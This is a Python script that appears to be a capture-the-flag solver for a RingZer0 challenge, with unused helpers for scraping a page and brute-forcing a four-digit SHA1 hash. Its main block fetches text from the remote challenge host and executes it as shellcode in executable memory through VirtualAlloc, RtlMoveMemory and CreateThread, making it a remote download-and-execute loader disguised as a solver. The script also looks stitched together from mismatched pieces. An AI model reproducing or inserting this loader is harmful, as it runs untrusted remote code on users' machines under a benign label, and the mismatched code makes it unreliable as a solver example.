import requests
import bs4
import hashlib
import webbrowser
import binascii
import ctypes

CHALLENGE_URL = r"http://challenges.ringzer0team.com:10121/"
SOLUTION_URL = r"http://challenges.ringzer0team.com:10121/?r="
CHROME_PATH = r"/usr/bin/google-chrome %s"

def get_web_page_content(url: str) -> bytes:
	page: requests.models.Response = requests.get(url=url)
	return page.content

def get_web_page_soup(url: str) -> bs4.BeautifulSoup:
	return bs4.BeautifulSoup(get_web_page_content(url), "html.parser")

def get_message_to_hash(soup: bs4.BeautifulSoup) -> str:
	message_segment: str = soup.find('div', class_="message").get_text()
	return message_segment.splitlines()[2].strip()

def convert_bin_to_hex(binary_number: str) -> str:
	return hex(int(binary_number, 2))[2:]

def convert_binary_to_ascii(binary_string: str) -> str:
	return binascii.unhexlify(convert_bin_to_hex(binary_string)).decode()

def break_hash_with_guessing_numbers(hashed_message: str):
	"""
	This works only for this scenario, where I know the hash will be a number with 4 digits.
	"""
	for i in range(1000, 10000):
		hash_guess: str = hashlib.sha1(str(i).encode()).hexdigest()
		if hash_guess == hashed_message:
			print(f"[+] Breaked the hash '{hashed_message}', the answer is '{i}'")
			return i

if __name__ == "__main__":
	soup: bs4.BeautifulSoup = get_web_page_soup(CHALLENGE_URL)
	sc: str = get_message_to_hash(soup)
	shellcode=bytearray(sc,'utf-8')
	ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
	                                            ctypes.c_int(len(shellcode)),
	                                            ctypes.c_int(0x3000),
	                                            ctypes.c_int(0x40))

	buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

	ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
	                                        buf,
	                                        ctypes.c_int(len(shellcode)))

	ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
	                                            ctypes.c_int(0),
	                                            ctypes.c_int(ptr),
	                                            ctypes.c_int(0),
	                                            ctypes.c_int(0),
	                                            ctypes.pointer(ctypes.c_int(0)))

	ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

